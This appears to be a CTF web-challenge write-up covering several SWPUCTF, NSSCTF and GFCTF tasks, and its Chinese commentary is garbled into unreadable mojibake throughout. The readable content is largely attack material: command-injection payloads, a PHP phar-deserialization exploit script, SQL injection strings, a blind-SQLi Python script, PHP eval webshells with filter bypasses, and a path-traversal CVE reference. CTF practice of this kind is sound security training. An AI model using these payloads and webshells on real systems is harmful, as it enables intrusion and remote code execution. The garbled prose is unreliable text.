ä¸€ä¸ªæ˜¯ifæ¡ä»¶é‡Œé¢é€šè¿‡evalç›´æ¥å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸”èƒ½å›æ˜¾å‡ºæ¥ï¼Ÿï¼Ÿï¼Ÿè¿™é‡Œæœ‰ç‚¹ä¸æ‡‚ï¼Œå…ˆè®°ä¸‹æ¥å§ check=eval(system('cat /flag')) ä¸€ä¸ªæ˜¯é€šè¿‡é—­åˆï¼šcheck=1) eval(system(â€˜cat /flagâ€™));/* è¿™é‡Œæˆ‘å½“æ—¶æ²¡æˆåŠŸå°±æ˜¯ç”¨çš„æ˜¯//ï¼Œè¿™ç§åªèƒ½æ³¨é‡Šä¸€è¡Œï¼Œæ˜¾ç„¶ä¸è¡Œ [SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser è¿™é‡Œåˆšå¼€å§‹ç»™äº†ä¸Šä¼ æ–‡ä»¶ä¸è¯»å–æ–‡ä»¶åŠŸèƒ½ã€‚å› ä¸ºä»–ç›´æ¥å°†æ–‡ä»¶åç¼€æ”¹ä¸ºäº† txtï¼Œwebshellå°±åˆ«æƒ³äº†ï¼Œå°è¯•äº†åŠå¤©ï¼Œæˆ‘çªç„¶æƒ³åˆ°ç›®å½•ç©¿è¶Šï¼Œä¸è¿‡è¿‡æ»¤äº†â€¦/ï¼Œä¹‹ååˆæƒ³åˆ°ä¼ªåè®®ï¼Œå¹¸è¿åœ°æ˜¯fileæ²¡è¿‡æ»¤ï¼Œç›´æ¥å°±èƒ½è¯»å–åˆ°ä¸»ç›®å½•ä¸‹çš„æ–‡ä»¶äº† è¯»å–äº†read.phpä¸upload.phpå‘ç°è¿˜å­˜åœ¨class.phpï¼Œä»£ç å¦‚ä¸‹ class aa{ public $name; public function __construct(){ $this-&gt;name='aa'; } public function __destruct(){ $this-&gt;name=strtolower($this-&gt;name); } } class ff{ private $content; public $func; public function __construct(){ $this-&gt;content=\"\\&lt;?php @eval(\\$_POST[1]);?&gt;\"; } public function __get($key){ $this-&gt;$key-&gt;{$this-&gt;func}($_POST['cmd']); //cmd=lsç­‰ç­‰ } } class zz{ public $filename; public $content='surprise'; public function __construct($filename){ $this-&gt;filename=$filename; } public function filter(){ if(preg_match('/^\\/|php:|data|zip|\\.\\.\\//i',$this-&gt;filename)){ die('è¿™ä¸åˆç†'); } } public function write($var){ $filename=$this-&gt;filename; $lt=$this-&gt;filename-&gt;$var; //æ­¤åŠŸèƒ½åºŸå¼ƒï¼Œä¸æƒ³å†™äº† } public function getFile(){ $this-&gt;filter(); $contents=file_get_contents($this-&gt;filename); if(!empty($contents)){ return $contents; }else{ die(\"404 not found\"); } } public function __toString(){ $this-&gt;{$_POST['method']}($_POST['var']); //method=write;var=content return $this-&gt;content; } } class xx{ public $name; public $arg; public function __construct(){ $this-&gt;name='eval'; $this-&gt;arg='phpinfo();'; } public function __call($name,$arg){ $name($arg[0]); } } å…¶ä¸­read.phpä»£ç  å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†getfileå‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¸ªä¸€ä¸‹ä¼šå‘ç°ï¼Œè¯¥å‡½æ•°å­˜åœ¨file_get_contentsæ–¹æ³•ï¼Œå†ç»“åˆæ–‡ä»¶ä¸Šä¼ ï¼Œä¸éš¾æƒ³åˆ°pharååºåˆ—åŒ–äº†ï¼Œæ¥ä¸‹æ¥å°±å…ˆæ„é€ é“¾å­ï¼Œåœ¨æ„é€ pharæ–‡ä»¶ ä¸è¿‡è¿™é‡Œå…ˆè¯´ä¸€ä¸ªè¯¯åŒºï¼Œå½“æ—¶æˆ‘çœ‹åˆ°æ–‡ä»¶é‡Œé¢æœ‰ä¼—å¤šéœ€è¦postä¼ å‚çš„å‚æ•°ï¼Œæˆ‘å°±è’™äº†ï¼Œæˆ‘æƒ³ç€æ€ä¹ˆåœ¨æ„é€ é“¾å­çš„æ—¶å€™è¿›è¡Œpostä¼ å‚å•Šï¼Œç»“æœå°±ä¸ä¼šäº†ï¼Œçœ‹äº†wpå‘ç°ã€‚å¦‚æœæˆ‘ä»¬ä¸Šä¼ äº†pharæ–‡ä»¶ï¼Œå½“è®¿é—®çš„æ—¶å€™ï¼Œä»–ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åœ¨è¯»å–é¡µé¢è¿›è¡Œpostä¼ å‚å³å¯ã€‚ ç›´æ¥çœ‹é“¾å­aaç±»-ã€‹aaç±».name-ã€‹zzç±».tostring-ã€‹zzç±».write-ã€‹ffç±».get-ã€‹xxç±».call &lt;?php class aa{ public $name; } class ff{ private $content; public $func = 'system'; public function __construct(){ $this-&gt;content=new xx(); //æ³¨æ„contentçš„èµ‹å€¼ } } class zz{ public $filename; public $content; } class xx{ public $name; public $arg; } $phar = new Phar(\"exp.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //è®¾ç½®stub $pop = new aa(); $pop-&gt;name = new zz(); $pop-&gt;name-&gt;filename = new ff(); $phar-&gt;setMetadata($pop); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; æœ€ç»ˆä¸Šä¼ æ–‡ä»¶åï¼Œç”¨pharè¯»å–æ–‡ä»¶å³å¯ [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS &lt;?php error_reporting(0); highlight_file(__FILE__); function strCheck($cmd) { if(!preg_match(\"/\\;|\\&amp;|\\\\$|\\x09|\\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i\", $cmd)){ return($cmd); } else{ die(\"i hate this\"); } } $cmd=$_GET['cmd']; strCheck($cmd); shell_exec($cmd); ?&gt; æ— å›æ˜¾RCEï¼Œå¹¸è¿åœ°æ˜¯æ²¡ç¦ç”¨teeï¼Œç›´æ¥é…åˆlså°†å†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶å³å¯ï¼šcmd=cat /f*| tee 1.txt [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]Pingpingping &lt;?php highlight_file(__FILE__); error_reporting(0); $_ping = $_GET['Ping_ip.exe']; if(isset($_ping)){ system(\"ping -c 3 \".$_ping); }else{ $data = base64_encode(file_get_contents(\"error.png\")); echo \"&lt;img src='data:image/png;base64,$data'/&gt;\"; } ç®€å•çš„å‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡æ³¨æ„å‚æ•°çš„ä¼ å‚å³å¯ï¼š?Ping[ip.exe=1 | cat /flag [NSSCTF 2022 Spring Recruit]babysql hacker!!black_list is /if|and|\\s|#|--/i è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šç¬¦ï¼Œé‚£/**/ä»£æ›¿ç©ºæ ¼ï¼Œå•å¼•å·é—­åˆåé¢çš„å•å¼•å·å³å¯ username=-1'/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/flag)' ç”±äºè¾“å…¥ä¸Šè¿°payloadï¼Œé¡µé¢å›æ˜¾æœ‰flagå­—æ ·ã€‚å› æ­¤ä¹Ÿå¯ä»¥ç›²æ³¨è¿›è¡Œ import string import requests import time strings = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\",#$&amp;'()*+-./:;&lt;=&gt;?@[\\]^_`{|}~\" pwd = '' while True: flag = True for i in strings: data = {\"username\": f\"tarnisha'/**/or/**/database()/**/like/**/'{pwd+i}%\"} response = requests.post(\"http://node2.anna.nssctf.cn:28793/\", data=data) time.sleep(0.1) if \"flag\" in response.text: pwd += i print(pwd) flag = False break if flag: break [GFCTF 2021]Baby_Web è¿™é‡Œä¹Ÿæ˜¯é—å¿˜è¿™ä¸ªçŸ¥è¯†ç‚¹äº†ï¼Œä¸çŸ¥é“å¦‚ä½•è¿›è¡Œç›®å½•ç©¿è¶Šï¼š åˆ©ç”¨æ¼æ´ä¸ºï¼šCVE-2021-41773\\CVE-2021-42013ï¼Œå…·ä½“å¯å‚è€ƒï¼šCVE-2021-41773 æ¼æ´å¤ç° è¿™é‡Œæˆ‘çš„dirsearchä¹Ÿæ‰«å‡ºæ¥è¿‡è¿™ä¸ªæ¼æ´ï¼Œä½†æˆ‘ç›´æ¥åœ¨URLä¸Šå‘é€å°±ä¸å¯ï¼Œå¿…é¡»ç”¨bpï¼ˆä¸ç†è§£ï¼‰ è¿™é‡Œæé†’ç€æˆ‘ï¼Œåœ¨æ‰«ç›®å½•çš„æ—¶å€™å‡ºç°äº†cgi-binå°±åº”è¯¥è”æƒ³åˆ°ç›®å½•ç©¿è¶Š éªŒè¯æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–æºç äº†ï¼Œä»–æç¤ºæºç åœ¨ä¸Šå±‚ç›®å½•çš„xxx.php.txtï¼ŒçŒœæµ‹xxxä¸ºindex &lt;h1&gt;Welcome To GFCTF 12th!!&lt;/h1&gt; &lt;?php error_reporting(0); define(\"main\",\"main\"); include \"Class.php\"; $temp = new Temp($_POST); $temp-&gt;display($_GET['filename']); ?&gt; &lt;!--æºç è—åœ¨ä¸Šå±‚ç›®å½•xxx.php.txté‡Œé¢ï¼Œä½†ä½ æ€ä¹ˆæ‰èƒ½çœ‹åˆ°å®ƒå‘¢?--&gt; è¯»å–Class.phpï¼Œåˆšå¼€å§‹åªè¾“å…¥Class.phpç«Ÿç„¶è¯»å–ä¸åˆ°ï¼Œè”æƒ³ä¹‹å‰ï¼Œæˆ‘å°è¯•æ·»åŠ txtæˆåŠŸäº† &lt;?php defined('main') or die(\"no!!\"); Class Temp{ private $date=['version'=&gt;'1.0','img'=&gt;'https://www.apache.org/img/asf-estd-1999-logo.jpg']; private $template; public function __construct($data){ $this-&gt;date = array_merge($this-&gt;date,$data); } public function getTempName($template,$dir){ if($dir === 'admin'){ $this-&gt;template = str_replace('..','','./template/admin/'.$template); if(!is_file($this-&gt;template)){ die(\"no!!\"); } } else{ $this-&gt;template = './template/index.html'; } } public function display($template,$space=''){ extract($this-&gt;date);//å°†é”®å€¼å½“åšå˜é‡ï¼Œå€¼å½“åšå˜é‡çš„å€¼ $this-&gt;getTempName($template,$space); include($this-&gt;template); } public function listdata($_params){ $system = [ 'db' =&gt; '', 'app' =&gt; '', 'num' =&gt; '', 'sum' =&gt; '', 'form' =&gt; '', 'page' =&gt; '', 'site' =&gt; '', 'flag' =&gt; '', 'not_flag' =&gt; '', 'show_flag' =&gt; '', 'more' =&gt; '', 'catid' =&gt; '', 'field' =&gt; '', 'order' =&gt; '', 'space' =&gt; '', 'table' =&gt; '', 'table_site' =&gt; '', 'total' =&gt; '', 'join' =&gt; '', 'on' =&gt; '', 'action' =&gt; '', 'return' =&gt; '', 'sbpage' =&gt; '', 'module' =&gt; '', 'urlrule' =&gt; '', 'pagesize' =&gt; '', 'pagefile' =&gt; '', ]; $param = $where = []; $_params = trim($_params); //ä¸»è¦å»é™¤å­—ç¬¦ä¸²æ”¶å°¾ç©ºæ ¼ç¬¦ $params = explode(' ', $_params); //æŒ‰ç…§ç©ºæ ¼å°†å­—ç¬¦ä¸²åˆ†å‰²ä¸ºæ•°ç»„ if (in_array($params[0], ['list','function'])) { //çœ‹æ•°ç»„æ˜¯å¦å­˜åœ¨åé¢æ•°ç»„çš„æŒ‡å®šå€¼ $params[0] = 'action='.$params[0]; } foreach ($params as $t) { $var = substr($t, 0, strpos($t, '='));//æ‰¾å¯»=ç¬¦å·ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼š0-ã€‹ä½ç½® $val = substr($t, strpos($t, '=') + 1);//ä½ç½®+1ä»¥åå¾—ï¼ˆä¸åŒ…æ‹¬ä½ç½®+1ï¼‰ if (!$var) {//action=action=function //var=actionï¼Œval=function continue; } if (isset($system[$var])) { $system[$var] = $val;//action=ã€‹functionï¼› } else { $param[$var] = $val; //action=ã€‹function } } // action switch ($system['action']) { case 'function': if (!isset($param['name'])) { //nameé”®å€¼çš„å€¼å¿…é¡»å­˜åœ¨ä¸”ä¸ºå·²ç»å®šä¹‰çš„å‡½æ•° return 'hacker!!'; } elseif (!function_exists($param['name'])) { return 'hacker!!'; } $force = $param['force']; if (!$force) { $p = []; foreach ($param as $var =&gt; $t) { if (strpos($var, 'param') === 0) {//è¿”å›paramåœ¨varä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½® $n = intval(substr($var, 5)); $p[$n] = $t; } } if ($p) { $rt = call_user_func_array($param['name'], $p); } else { $rt = call_user_func($param['name']); } return $rt; }else{ return null; } case 'list': return json_encode($this-&gt;date); } return null; } } å¦å¤–è¿˜æœ‰/template/admin/ä¸‹çš„éƒ¨åˆ†æºç ï¼š &lt;!--&lt;img src=\"&lt;?php echo $img;?&gt;\"&gt;--&gt; &lt;div&gt;&lt;?php echo $this-&gt;listdata(\"action=list module=$mod\");?&gt;&lt;div&gt;//module=action=function &lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt; action=listã€module=$mod è¿™é“é¢˜ä»£ç å®¡è®¡å®¡çš„æˆ‘å¾ˆç´¯ï¼ˆå› ä¸ºå¤ªèœï¼‰ï¼Œæœ€åè¿˜æ˜¯é™·å…¥äº†ä¸€ä¸ªå°è¯¯åŒºï¼Œè¿˜æ˜¯æ— å¥ˆçœ‹äº†wpï¼š [GFCTF 2021]Baby_Web(CVE-2021-41773) ä»ä¸€é“é¢˜å…¥é—¨PHPä»£ç å®¡è®¡â€“å¾ˆè¯¦ç»† è¿™é‡Œæˆ‘å®¡è®¡çš„æ—¶å€™ï¼Œæ€è·¯éƒ½ç†é¡ºäº†ï¼Œå°±æ˜¯æœ€ç»ˆä¼ payloadé™·å…¥è¯¯åŒºäº†ã€‚ æ€»çš„æ¥è¯´ï¼Œå°±æ˜¯éœ€è¦åœ¨filenameä¼ å€¼ä¸­ï¼Œè¦ä½¿å…¶åˆç†åŒ–ï¼Œä½¿å¾—/template/admin/filenameä¸ºä¸€ä¸ªåˆæ³•æ–‡ä»¶ å½“ç„¶è¿™é‡Œå°è¯•å‡ æ¬¡å°±çŸ¥é“index.htmlå³å¯ éšåæˆ‘ä»¬å°±èƒ½å°†ä¸Šè¿°$this-&gt;listdata(\"action=list module=$mod\")æ‰€åœ¨æ–‡ä»¶åŒ…å«è¿›å»ï¼Œè€ŒåŒ…å«è¿›å»çš„ç›®çš„å°±æ˜¯ä¸ºäº†è°ƒç”¨æœ€ç»ˆçš„call_user_func_arrayæˆ–call_user_funcå‡½æ•°ï¼Œæœ€ç»ˆRCE è€Œå…¶ä¸­æˆ‘åœ¨ä¼ å‚æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¥ä¸ºparamæ•°ç»„ä¸­çš„action=functionçš„actionæ˜¯ä¸ªé”®å€¼ï¼Œæ‰€ä»¥å¼„å¾—æˆ‘å§‹ç»ˆæ²¡æˆåŠŸï¼Œçœ‹äº†wpæ€è€ƒäº†ä¸€ä¼šå„¿å‘ç°åº”è¯¥ä¼šæœ‰æ•°å­—ç´¢å¼•çš„ï¼Œä¹Ÿå°±æ˜¯æ¯”å¦‚ï¼š0=ã€‹â€œaction=functionâ€è¿™æ ·ç†è§£çš„è¯ï¼Œé‚£system['action']=functionå°±æˆç«‹äº†ã€‚å…·ä½“ä¸å†è¯¦è¿°ï¼Œä¸Šè¿°æ–‡ç« å¾ˆè¯¦ç»†ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„æœ€ç»ˆçš„å‘½ä»¤æ‰§è¡Œå‡½æ•°è¿˜è¢«ç¦äº†å¾ˆå¤šï¼Œä½†æ˜¯æ— å›æ˜¾å‡½æ•°execæ²¡ç¦ç”¨ï¼Œé‚£ç›´æ¥å°†è¾“å‡ºé‡å®šå‘è¯»å–å³å¯ï¼Œå½“ç„¶è¿˜éœ€è¦æ³¨æ„è¿™é‡Œçš„ç©ºæ ¼ï¼ˆç”¨åˆç†å­—ç¬¦ä»£æ›¿ï¼‰ space=admin&amp;mod=hybcx action=function name=exec param0a=cat${IFS}/f11111111aaaagggg&gt;/var/www/html/1.txt è¿™é‡Œçœ‹äº†wpè¿˜æœ‰æ–¹æ³•äºŒï¼Œå½“æ—¶åˆ†æä¹Ÿæ²¡æƒ³ç€åˆ©ç”¨call_user_funcå‡½æ•°ï¼Œå› ä¸ºé‚£é‡Œåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæˆ‘æ²¡æ·±åº¦æ€è€ƒæ˜¯å¦èƒ½åˆ©ç”¨ï¼Œä½†è¿™é‡Œçœ‹äº†wpå‘ç°ï¼Œç›´æ¥ä¼ å…¥phpinfoå‡½æ•°ï¼ˆè¿™ä¸ªå‡½æ•°ä¸éœ€è¦å‚æ•°ï¼‰è€Œflagä¹Ÿæ°å¥½åœ¨å…¶ä¸­ space=admin&amp;mod=hybcx action=function name=phpinfo [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]ä¸€é”®è¿æ¥! &lt;?php highlight_file(__FILE__); error_reporting(0); $md5_1 = $_GET['md5_1']; $md5_2 = $_GET['md5_2']; $sha1_1 = $_GET['sha1_1']; $sha1_2 = $_GET['sha1_2']; $new_player =$_GET['new_player']; if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) { if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) { if (file_get_contents($new_player) === \"Welcome to NSSCTF!!!\") { echo \"Congratulations~~~~~~~~~\"; echo \"è¯•è¯•need Antsword&lt;br/&gt;\"; @eval($_POST['Nss']); }else{ echo \"å¯æ›¾å¬è¿‡dataåè®®?\"; } } else { echo \"sha1åˆå¦‚ä½•ç›¸ç­‰å‘¢\"; } } else { echo \"å¦‚ä½•è®©md5å€¼ç›¸ç­‰å‘¢Â¿\"; } å¦‚ä½•è®©md5å€¼ç›¸ç­‰å‘¢Â¿ æ€è·¯å¾ˆç®€å•ï¼Œæ•°ç»„ç»•è¿‡ï¼Œä¼ªåè®®ç»•è¿‡file_get_contentsï¼Œæœ€åwebshell [SWPUCTF 2022 æ–°ç”Ÿèµ›]file_master è¿™é¢˜æŸä¸ªçŸ¥è¯†ç‚¹ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§ æ¥åˆ°é¦–é¡µï¼Œè¿™é‡Œæˆ‘å¯¹æŸ¥çœ‹æ–‡ä»¶åŠŸèƒ½æ²¡åšå°è¯•ï¼Œåé¢çœ‹wpå‘ç°è¿™ä¸ªå¯ä»¥ç”¨æ¥æŸ¥çœ‹æºç è¿›ä¸€æ­¥åˆ†æï¼Œç›´æ¥æŠ“åŒ…è¾“å…¥index.phpå³å¯ï¼Œè¿™é‡Œæˆ‘ç›´æ¥æ”¾ä¸Šæºç  &lt;?php session_start(); if(isset($_GET['filename'])){ echo file_get_contents($_GET['filename']); } else if(isset($_FILES['file']['name'])){ $whtie_list = array(\"image/jpeg\"); $filetype = $_FILES[\"file\"][\"type\"]; if(in_array($filetype,$whtie_list)){ $img_info = @getimagesize($_FILES[\"file\"][\"tmp_name\"]); if($img_info){ if($img_info[0]&lt;=20 &amp;&amp; $img_info[1]&lt;=20){ if(!is_dir(\"upload/\".session_id())){ mkdir(\"upload/\".session_id()); } $save_path = \"upload/\".session_id().\"/\".$_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$save_path); $content = file_get_contents($save_path); if(preg_match(\"/php/i\",$content)){ sleep(5); @unlink($save_path); die(\"hacker!!!\"); }else{ echo \"upload success!! upload/your_sessionid/your_filename\"; } }else{ die(\"image hight and width must less than 20\"); } }else{ die(\"invalid file head\"); } }else{ die(\"invalid file type!image/jpeg only!!\"); } }else{ echo '&lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents(\"welcome.jpg\")).'\"&gt;'; } ?&gt; è¿™é‡Œä¸åˆ†æäº†ï¼Œæˆ‘é»‘ç›’åšï¼Œå½“æ—¶ä¸Šä¼ ï¼Œé¦–å…ˆæ²¡é™åˆ¶åç¼€ï¼Œç„¶åæ˜¯mimeç±»å‹åªèƒ½ä¸ºjpegï¼Œåé¢ä¿®æ”¹å®Œä¹‹åï¼Œè¯´æ–‡ä»¶å¤´æ— æ•ˆï¼Œè¿™é‡Œç”¨äº†å‡ ä¸ªä¼¼ä¹åªæœ‰GIF89aæ‰è¡Œã€‚ éšååˆå‡ºæ¥è¯´å›¾ç‰‡çš„é«˜åº¦ä¸å®½åº¦å¿…é¡»å°äº20ï¼Œè¿™é‡Œå°±è’™äº†ï¼Œä¸çŸ¥é“å¦‚ä½•é™åˆ¶ï¼Œç½‘ä¸Šæ‰¾äº†åŠå¤©ï¼Œè¿˜ä»¥ä¸ºç”¨å·¥å…·æ¥ä¿®æ”¹ï¼Œçœ‹äº†wpå‘ç°ä»£ç å³å¯ã€‚ã€‚ã€‚ å¦‚ä¸‹å›¾ï¼Œç›´æ¥å®å®šä¹‰å®Œç¾è§£å†³ è¿™é‡Œç”±äºè¿˜ä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦å«æœ‰phpå­—ç¬¦ï¼Œå› æ­¤éœ€è¦çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œè¿™é‡Œå€Ÿç”¨äººå®¶çš„æ€»ç»“äº† phpçŸ­æ ‡ç­¾ç»•è¿‡ phpä¸­æœ€å¸¸è§çš„æ ‡ç­¾ä¸º ä¸è¿‡åœ¨é¢˜ç›®ä¸Šä¼ æ—¶å¯èƒ½ä¼šè¢«wafè¿‡æ»¤æ‰phpå…³é”®å­—ã€‚æ ¹æ®æŸ¥è¯¢ç»“æœï¼Œè¿˜æœ‰å››ç§phpçš„æ ‡ç­¾ï¼Œåˆ†åˆ«æ˜¯ï¼š â‘  ä»…åœ¨é…ç½®short_open_tag=onæ—¶å¯ä»¥ä½¿ç”¨ï¼Œé€‚åˆæ‰§è¡Œphpè¯­å¥ï¼› â‘¡å³ä½¿é…ç½®short_open_tag=offæ—¶ä¾ç„¶å¯ä»¥ä½¿ç”¨ï¼Œç›¸å½“äºï¼Œé€‚åˆè¾“å‡ºphpè¯­å¥~ ä¸Šè¿°äºŒè€…çš„çŸ­æ ‡ç­¾éƒ½ä¸å¿…é—­åˆï¼ˆå³?&gt;å¯ä»¥çœç•¥ä¸å†™ï¼Œä¹Ÿå¯ä»¥è¿æ¥æˆåŠŸ &lt;? @eval($_POST['a']);?&gt; &lt;?= @eval($_POST['a']);?&gt; &lt;? @eval($_POST['a']); &lt;?= @eval($_POST['a']); ä½†è¿™é‡Œä¸çŸ¥ä¸ºä½•ï¼Œä¼¼ä¹å¿…é¡»ç”¨æœ‰=ç¬¦å·çš„ï¼ˆå› ä¸ºé…ç½®é—®é¢˜ï¼‰ã€‚ä¸Šä¼ ä¹‹åï¼Œå¸¸è§„æ‰¾flagå³å¯ [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]NSS_HTTP_CHEKER è€ç”Ÿå¸¸è°ˆçš„httpåè®®çŸ¥è¯†ï¼šä¸èµ˜è¿°äº† [SWPU 2018]SimplePHP base.php &lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;web3&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\"&gt; &lt;script src=\"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=\"navbar navbar-default\" role=\"navigation\"&gt; &lt;div class=\"container-fluid\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;a class=\"navbar-brand\" href=\"index.php\"&gt;é¦–é¡µ&lt;/a&gt; &lt;/div&gt; &lt;ul class=\"nav navbar-nav navbra-toggle\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"file.php?file=\"&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"upload_file.php\"&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"index.php\"&gt;&lt;span class=\"glyphicon glyphicon-user\"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt; upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=\"utf-8\"&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = \"center\"&gt; &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt; p{ margin:0 auto} &lt;/style&gt; &lt;div&gt; &lt;form action=\"upload_file.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;æ–‡ä»¶å:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\"&gt;&lt;br&gt; &lt;input type=\"submit\" name=\"submit\" value=\"æäº¤\"&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; ç»§ç»­æŸ¥çœ‹function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\";//éšæœºå‘½åæ–‡ä»¶å //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { //åº”è¯¥æ˜¯é˜²æ­¢æ–‡ä»¶åé‡å¤ï¼Œå¯¼è‡´è¦†ç›– unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); //æ²¡æ¯›ç—…å°±ä¸Šä¼  echo '&lt;script type=\"text/javascript\"&gt;alert(\"ä¸Šä¼ æˆåŠŸ!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); //æŒ‰ç…§.ç¬¦å·å°†æ–‡ä»¶ååˆ†å‰²å¼€æˆæ•°ç»„ $extension = end($temp); //æ•°ç»„çš„æŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„æœ€åä¸€ä¸ªå•å…ƒï¼Œè¿™é‡Œå°±æ˜¯åç¼€å if(empty($extension)) { //echo \"&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { //ç™½åå•è¿‡æ»¤ return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; æœ€åçœ‹ä¸€ä¸‹æŸ¥çœ‹æ–‡ä»¶ï¼šfile.php &lt;?php header(\"content-type:text/html;charset=utf-8\"); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); //é™åˆ¶äº†ç›®å½• $file = $_GET[\"file\"] ? $_GET['file'] : \"\"; //æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶ if(empty($file)) { echo \"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\"; } $show = new Show(); if(file_exists($file)) { //å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è°ƒç”¨showå‡½æ•°å±•ç¤º $show-&gt;source = $file; $show-&gt;_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?&gt; å†çœ‹ä¸€ä¸‹class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; åˆ†æäº†ä¸€æ³¢ä¸Šè¿°æ–‡ä»¶ä»£ç 